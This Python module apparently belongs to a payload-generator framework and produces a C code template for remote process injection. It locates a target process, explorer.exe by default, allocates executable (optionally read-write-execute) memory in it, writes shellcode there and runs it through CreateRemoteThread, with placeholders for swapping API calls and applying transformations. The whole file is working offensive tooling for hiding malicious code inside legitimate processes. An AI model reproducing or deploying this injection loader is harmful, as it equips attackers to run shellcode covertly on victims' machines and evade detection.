from string import Template

class processinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'explorer.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <tlhelp32.h>", 
                "#include <string.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return ['CreateToolhelp32Snapshot', 'Process32First', 'Process32Next', 'CloseHandle', 'OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'WaitForSingleObject']

    def template(self) -> str:
        return Template("""
    int pid = 0;
    HANDLE hProc = NULL;

    {transformers}

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
            
    hProcSnap = {CreateToolhelp32Snapshot}(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!{Process32First}(hProcSnap, &pe32)) {{
            CloseHandle(hProcSnap);
            return 0;
    }}
            
    while ({Process32Next}(hProcSnap, &pe32)) {{
        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                pid = pe32.th32ProcessID;
                break;
        }}
    }}
            
    {CloseHandle}(hProcSnap);

    // try to open target process
    hProc = {OpenProcess}( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE, (DWORD) pid);

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = {VirtualAllocEx}(hProc, NULL, {shellcodeSize}, MEM_COMMIT, $memoryPermission);
    {WriteProcessMemory}(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
    
    hThread = {CreateRemoteThread}(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {{
        {WaitForSingleObject}(hThread, 500);
        {CloseHandle}(hThread);
        return 0;
    }}

    {CloseHandle}(hProc);
    return 0;
""").substitute(target=self.target, memoryPermission=self.memoryPermission)